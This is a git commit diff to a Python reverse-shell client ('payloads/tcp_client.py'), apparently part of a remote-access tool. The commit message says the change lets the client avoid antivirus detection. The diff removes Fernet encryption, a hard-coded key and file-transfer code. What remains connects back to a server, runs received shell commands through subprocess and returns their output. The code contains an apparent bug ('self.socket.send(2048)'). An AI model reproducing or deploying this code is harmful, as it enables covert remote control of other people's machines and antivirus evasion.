e8e0b9258dfb2a6ac77a69bf231a8fe6f48329a3
David Hunt <49954156+privateducky@users.noreply.github.com>
2019-05-29 20:25:18 -0600

    adjusting client to not require cryptography - also not get caught by an AV (#25)

--- payloads/tcp_client.py
+++ payloads/tcp_client.py
@@ -7,8 +7,6 @@ import subprocess
 import sys
 import time
 
-from cryptography.fernet import Fernet
-
 
 def command_registrar():
     registry = {}
@@ -30,16 +28,12 @@ class Commands:
     @command
     def cd(self, data, *args, **kwargs):
         directory = data[3:].decode('utf-8')
-        try:
-            os.chdir(directory.strip())
-            self.send('', print_output=False)
-        except:
-            self.send('cd: %s: No such file or directory\n' % directory)
+        os.chdir(directory.strip())
 
     @command
     def hello(self, *args, **kwargs):
         """this prints hello"""
-        self.send('hello')
+        self.print_output('hello')
 
     @command
     def background(self, *args, **kwargs):
@@ -51,34 +45,7 @@ class Commands:
         """get details on functions to run"""
         commands = self.get_all_commands()
         help_items = ['{0}: {1}'.format(command, func.__doc__) for command, func in commands.items()]
-        self.send('\n'.join(help_items))
-
-    @command
-    def transfer(self, data, *args, **kwargs):
-        """transfer a file"""
-        data = data.decode('utf-8')
-        transfer_command = [arg for arg in data.split(' ') if arg]
-
-        if transfer_command[1] == 'get':
-            remote_file = transfer_command[2]
-
-            try:
-                with open(remote_file, 'r') as f:
-                    file_data = f.read()
-                self.send(file_data, print_output=False)
-            except Exception as e:
-                self.send('error retrieving file: ' + str(e) + '\n')
-
-        if transfer_command[1] == 'put':
-            remote_file = transfer_command[3]
-
-            file_data = self.receive()
-            try:
-                with open(remote_file, 'w+') as f:
-                    f.write(file_data.decode('utf-8'))
-                self.send('done')
-            except Exception as e:
-                self.send('error saving file: ' + str(e) + '\n')
+        self.print_output('\n'.join(help_items))
 
     def get_all_commands(self):
         return self.command.all
@@ -93,7 +60,6 @@ class Client(Commands):
         self.socket = None
         self.connection_retry = 5
         self.custom_commands = self.get_all_commands()
-        self.encryption_key = b'secretsecretsecretwbsecretsecretsecretsecre='
 
     def register_signal_handler(self):
         signal.signal(signal.SIGINT, self.quit_gracefully)
@@ -121,55 +87,32 @@ class Client(Commands):
             time.sleep(self.connection_retry)
             self.socket_connect()
 
-    def send(self, output_str, print_output=True):
+    def print_output(self, output_str):
         sent_message = str.encode(output_str)
-        cipher_text = self.encrypt(sent_message)
-        self.socket.send(struct.pack('>I', len(cipher_text)) + cipher_text)
-        if print_output:
-            print(output_str)
-
-    def receive(self):
-        raw_msg_len = self._recvall(4)
-        if not raw_msg_len:
-            return None
-        msg_len = struct.unpack('>I', raw_msg_len)[0]
-        cipher_text = self._recvall(msg_len)
-        output = self.decrypt(cipher_text)
-        return output
-
-    def _recvall(self, n):
-        data = b''
-        while len(data) < n:
-            packet = self.socket.recv(n - len(data))
-            if not packet:
-                return None
-            data += packet
-        return data
-
-    def encrypt(self, message):
-        f = Fernet(self.encryption_key)
-        token = f.encrypt(message)
-        return token
-
-    def decrypt(self, cipher_text):
-        f = Fernet(self.encryption_key)
-        token = f.decrypt(cipher_text)
-        return token
+        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
+        print(output_str)
 
     def receive_commands(self):
-        self.receive()
+        self.socket.recv(10)
         while True:
             try:
-                self.send(str(os.getcwd()) + '> ', print_output=False)
+                cwd = str.encode(str(os.getcwd()) + '> ')
+                self.socket.send(struct.pack('>I', len(cwd)) + cwd)
 
-                data = self.receive()
+                data = self.socket.recv(2048)
 
-                if not data:
-                    self.send('')
+                if data == b'':
+                    self.socket.send(2048)
                     break
-
                 command = self.parse_command(data)
-                if command in self.custom_commands:
+                if command == 'cd':
+                    directory = data[3:].decode('utf-8')
+                    try:
+                        os.chdir(directory.strip())
+                        self.print_output('')
+                    except:
+                        self.print_output('cd: %s: No such file or directory\n' % directory)
+                elif command in self.custom_commands:
                     self.run_custom_command(command, data)
                     if command == 'background':
                         break
@@ -189,9 +132,9 @@ class Client(Commands):
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = output_bytes.decode('utf-8', errors='replace')
         if output_str is not None:
-            self.send(output_str)
+            self.print_output(output_str)
         else:
-            self.send(' ', print_output=False)
+            self.print_output(' ')
 
     def run_custom_command(self, command, data):
         command_function = getattr(self, command)
@@ -218,3 +161,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
